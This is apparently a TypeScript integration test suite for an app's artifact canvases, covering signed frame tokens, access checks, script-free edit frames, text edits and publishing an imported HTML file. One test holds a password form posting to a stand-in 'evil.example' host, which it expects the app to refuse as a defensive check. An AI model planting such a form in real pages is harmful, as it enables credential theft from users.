import { randomUUID } from 'node:crypto'

import { createPrismaClient, insertFeedEvent, type PrismaClient, type User } from '@repo/db'
import { chatFileKey, legalDocuments, type ObjectStorage, type SecretStore } from '@repo/domain'
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'

import { createCaller } from '../router.ts'
import { serveArtifactFile, serveArtifactFrame } from '../services/artifacts/frame.ts'
import type { ChatContext } from '../services/chat/context.ts'
import { pageKeys, signArtifactToken } from '../services/chat/page-tokens.ts'

// The frames of an artifact on PostgreSQL (docs/plan/88-artifacts.md, Ар9, Ар12, Ар28, §7.10;
// slices 88.12 and 88.13; plan 93, АТ6): the calculator of the template — a canvas of one screen —,
// its frame for its viewer with its files by signed addresses, «Править текст» by the offsets of
// parse5, «Открыть как артефакт» of a file of a chat as a canvas of one screen, published as a site
// of HTML. Every test works in workspaces of its own and removes them.

const databaseUrl = process.env.DATABASE_URL
const PAGES = 'http://pages.localhost:3110'
const keys = pageKeys('synthetic-pages-secret-of-the-test-0001')
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 7, 7])

/** The bucket in memory: what web and core put, `get` gives back. */
const objects = new Map<string, Uint8Array>()
const storage = {
  get: async (_bucket: string, key: string) => {
    const bytes = objects.get(key)
    return bytes === undefined
      ? null
      : (async function* () {
          yield bytes
        })()
  },
  put: async (_bucket: string, key: string, bytes: Uint8Array) => {
    objects.set(key, bytes)
  },
} as unknown as ObjectStorage

const requiredConsents = legalDocuments.flatMap((document) =>
  document.required && document.consentType
    ? [{ documentType: document.consentType, documentVersion: document.version, granted: true }]
    : [],
)

describe.skipIf(!databaseUrl)('PostgreSQL: the frames of an artifact in the cabinet', () => {
  let db: PrismaClient
  const userIds: string[] = []

  beforeAll(() => {
    db = createPrismaClient({ databaseUrl: databaseUrl ?? '', log: [] })
  })
  afterEach(async () => {
    const users = userIds.splice(0)
    const workspaces = await db.workspace.findMany({
      where: { createdById: { in: users } },
      select: { id: true },
    })
    const owned = { workspaceId: { in: workspaces.map(({ id }) => id) } }
    await db.taskEvent.deleteMany({ where: { task: owned } })
    await db.pageReservation.deleteMany({ where: { page: owned } })
    await db.page.deleteMany({ where: owned })
    await db.pageTree.deleteMany({ where: owned })
    await db.artifact.deleteMany({ where: owned })
    await db.task.deleteMany({ where: owned })
    await db.project.deleteMany({ where: owned })
    await db.creditLedger.deleteMany({ where: { account: owned } })
    await db.creditHold.deleteMany({ where: { account: owned } })
    await db.billingAccount.deleteMany({ where: owned })
    await db.auditLog.deleteMany({ where: owned })
    await db.member.deleteMany({ where: owned })
    await db.workspace.deleteMany({ where: { id: owned.workspaceId } })
    await db.user.deleteMany({ where: { id: { in: users } } })
  })
  afterAll(async () => {
    await db.$disconnect()
  })

  async function person(name = 'Анна'): Promise<User> {
    const row = await db.user.create({
      data: { name, email: `${randomUUID()}@artifacts-cabinet.example.ru` },
    })
    userIds.push(row.id)
    await db.userConsent.createMany({
      data: requiredConsents.map((consent) => ({ ...consent, userId: row.id, source: 'sign_up' })),
    })
    return row
  }

  function callerOf(user: User) {
    const chat: ChatContext = {
      appEnv: 'test',
      browser: null,
      storage: () => storage,
      secrets: () => ({ transitEnsureKey: async () => {} }) as unknown as SecretStore,
      artifacts: null,
      pages: { baseDomain: 'pages.localhost', scheme: 'http', port: 3110 },
      pageViews: { origin: PAGES, appUrl: 'http://localhost:3110', keys },
    }
    return createCaller({
      prisma: db,
      headers: new Headers(),
      user,
      session: {
        id: randomUUID(),
        userId: user.id,
        token: `artifacts-cabinet-${randomUUID()}`,
        expiresAt: new Date('2030-01-01'),
        createdAt: new Date(),
        updatedAt: new Date(),
        ipAddress: null,
        userAgent: null,
      },
      billing: null,
      chat,
    })
  }

  const fonts = { css: '', urls: [] }
  const tokenOf = (url: string) => url.slice(url.lastIndexOf('/') + 1)

  it('frames the calculator for its viewer only, its files by addresses bound to them', async () => {
    const anna = await person()
    const caller = callerOf(anna)
    const { id } = await caller.artifact.create({
      kind: 'canvas',
      title: 'Калькулятор стоимости',
      projectId: null,
      templateId: 'cost-calculator',
    })
    const read = await caller.artifact.read({ artifactId: id })
    // One screen with its parts inside it; the settings at the top, for its script (АТ6).
    expect(read.blocks.map((block) => `${block.parent ?? '-'}/${block.kind}`).toSorted()).toEqual([
      '-/frame',
      '-/settings',
      'calc/html',
      'calc/script',
      'calc/style',
    ])
    // A picture of the screen: announced, then its bytes (as PUT /api/artifact-files does).
    const started = await caller.artifact.fileStart({
      artifactId: id,
      name: 'logo.png',
      sizeBytes: PNG.byteLength,
    })
    const row = await db.artifactFile.findUniqueOrThrow({ where: { id: started.fileId } })
    objects.set(row.objectKey, PNG)
    await db.artifactFile.update({
      where: { id: row.id },
      data: {
        state: 'ready',
        contentType: 'image/png',
        sha256: '0'.repeat(64),
        readyAt: new Date(),
        bytes: BigInt(PNG.byteLength),
      },
    })
    const html = read.blocks.find((block) => block.kind === 'html')!
    await caller.artifact.write({
      batch: {
        artifactId: id,
        opId: randomUUID(),
        ops: [
          {
            op: 'replace',
            block: html.key,
            ifRev: html.rev,
            content: `${html.content}<img alt="Логотип" src="${started.ref}"><a href="https://example.com">Заказать</a>`,
          },
        ],
      },
    })
    const view = await caller.artifact.frame({ artifactId: id, mode: 'view', frame: 'calc' })
    expect(view.url.startsWith(`${PAGES}/v/`)).toBe(true)
    const chat = {
      pageViews: { origin: PAGES, appUrl: 'http://localhost:3110', keys },
      storage: () => storage,
    } as unknown as ChatContext
    const served = await serveArtifactFrame(db, chat, {
      token: tokenOf(view.url),
      mode: 'view',
      fonts,
    })
    if (!served.ok) throw new Error('no frame')
    expect(served.html).toContain('id="raditi-settings"')
    expect(served.html).toContain('raditi-artifact')
    expect(served.html).not.toContain(started.ref)
    expect(served.sources.images).toHaveLength(1)
    expect(served.html).toContain(served.sources.images[0]!)
    const file = await serveArtifactFile(db, chat, { token: tokenOf(served.sources.images[0]!) })
    expect(file).toEqual({ ok: true, type: 'image/png', bytes: Buffer.from(PNG) })
    // The edit frame: no script, the bridge neither; ids in each element, links lead nowhere.
    const edit = await caller.artifact.frame({ artifactId: id, mode: 'edit', frame: 'calc' })
    expect(edit.url.startsWith('/api/artifact-frame/')).toBe(true)
    const copy = await serveArtifactFrame(db, chat, {
      token: tokenOf(edit.url),
      mode: 'edit',
      fonts,
    })
    if (!copy.ok) throw new Error('no edit frame')
    expect(copy.html).not.toContain('<script')
    expect(copy.html).toContain(`data-rid="${html.key}.2"`)
    expect(copy.html).toContain('href="#raditi-no-link"')
    expect(copy.html).not.toContain('https://example.com')
    // A token of one sort is never read as another, nor by someone else's role.
    expect(
      await serveArtifactFrame(db, chat, { token: tokenOf(edit.url), mode: 'view', fonts }),
    ).toEqual({ ok: false, status: 404 })
    // A token opens a frame block only: none named (the old mockup's), or a part of the screen.
    const signed = (frame?: string) =>
      signArtifactToken(keys.view, 'artifact', {
        artifactId: id,
        userId: anna.id,
        expiresAt: Date.now() + 60_000,
        ...(frame === undefined ? {} : { frame }),
      })
    for (const token of [signed(), signed(html.key), signed('nowhere')])
      expect(await serveArtifactFrame(db, chat, { token, mode: 'view', fonts })).toEqual({
        ok: false,
        status: 404,
      })
    // Someone else gets no address of the frame at all.
    const boris = callerOf(await person('Борис'))
    await expect(
      boris.artifact.frame({ artifactId: id, mode: 'view', frame: 'calc' }),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' })
    await caller.artifact.trash({ artifactId: id })
    expect(
      await serveArtifactFrame(db, chat, { token: tokenOf(view.url), mode: 'view', fonts }),
    ).toEqual({ ok: false, status: 404 })
    expect(
      await serveArtifactFile(db, chat, { token: tokenOf(served.sources.images[0]!) }),
    ).toEqual({ ok: false, status: 404 })
  })

  it('edits the text of one element by the offsets of parse5, plain text only', async () => {
    const anna = await person()
    const caller = callerOf(anna)
    const { id } = await caller.artifact.create({
      kind: 'canvas',
      title: 'Лендинг',
      projectId: null,
      templateId: null,
    })
    await caller.artifact.write({
      batch: {
        artifactId: id,
        opId: randomUUID(),
        ops: [
          {
            op: 'insert',
            block: 'home',
            after: null,
            kind: 'frame',
            content: '',
            props: { name: 'Главная', path: '/', x: 0, y: 0 },
          },
          {
            op: 'insert',
            block: 'hero',
            after: null,
            parent: 'home',
            kind: 'html',
            content: '<section><h1>Кофе <b>с собой</b></h1></section>',
          },
        ],
      },
    })
    // A document has no frame to open.
    const doc = await caller.artifact.create({
      kind: 'document',
      title: 'Заметки',
      projectId: null,
      templateId: null,
    })
    await expect(
      caller.artifact.frame({ artifactId: doc.id, mode: 'view', frame: 'home' }),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' })
    const answer = await caller.artifact.editText({
      artifactId: id,
      block: 'hero',
      ifRev: 1,
      element: 'hero.2',
      shape: ['b#hero.3'],
      edits: [{ slot: 0, text: 'Чай <и> ' }],
    })
    expect(answer.repeated).toBe(false)
    const after = await caller.artifact.read({ artifactId: id })
    expect(after.blocks.find((block) => block.key === 'hero')!.content).toBe(
      '<section><h1>Чай &lt;и&gt; <b>с собой</b></h1></section>',
    )
    await expect(
      caller.artifact.editText({
        artifactId: id,
        block: 'hero',
        ifRev: 2,
        element: 'hero.2',
        shape: [],
        edits: [{ slot: 0, text: 'x' }],
      }),
    ).rejects.toMatchObject({ code: 'CONFLICT' })
    // A person's HTML with a password form that sends it elsewhere is refused (§7.3).
    await expect(
      caller.artifact.write({
        batch: {
          artifactId: id,
          opId: randomUUID(),
          ops: [
            {
              op: 'insert',
              block: 'form',
              after: 'hero',
              parent: 'home',
              kind: 'html',
              content:
                '<form action="https://evil.example"><input type="password" name="p"></form>',
            },
          ],
        },
      }),
    ).rejects.toBeTruthy()
  })

  it('opens a .html file of a chat as a canvas of one screen and publishes it as a site', async () => {
    const anna = await person()
    const caller = callerOf(anna)
    const first = await caller.artifact.create({
      kind: 'document',
      title: 'Начало',
      projectId: null,
      templateId: null,
    })
    const { workspaceId } = await db.artifact.findUniqueOrThrow({
      where: { id: first.id },
      select: { workspaceId: true },
    })
    const task = await db.task.create({
      data: { workspaceId, createdById: anna.id, status: 'awaiting_user' },
    })
    const fileId = randomUUID()
    const page =
      '<!doctype html><html><head><title>Окна</title><style>h1{color:red}</style></head><body><h1>Окна</h1><script>1</script></body></html>'
    const bytes = new TextEncoder().encode(page)
    objects.set(chatFileKey(task.id, fileId), bytes)
    await insertFeedEvent(db, {
      taskId: task.id,
      turnId: null,
      row: {
        type: 'feed.file',
        payload: { v: 1, fileId, name: 'okna.html', sizeBytes: bytes.byteLength },
      },
    })
    const { id } = await caller.artifact.importFile({ taskId: task.id, fileId })
    const read = await caller.artifact.read({ artifactId: id })
    expect(read.kind).toBe('canvas')
    expect(read.title).toBe('Окна')
    expect(
      read.blocks.map((block) => `${block.parent ?? '-'}/${block.key}/${block.kind}`).toSorted(),
    ).toEqual(['-/home/frame', 'home/b2/style', 'home/b3/html', 'home/b4/script'])
    expect(read.blocks.find((block) => block.key === 'home')!.props).toMatchObject({
      name: 'Главная',
      path: '/',
    })
    const published = await caller.pages.publishArtifact({ artifactId: id, versionNo: null })
    const pageRow = await db.page.findUniqueOrThrow({
      where: { id: published.pageId },
      select: { kind: true },
    })
    expect(pageRow.kind).toBe('html')
  })
})
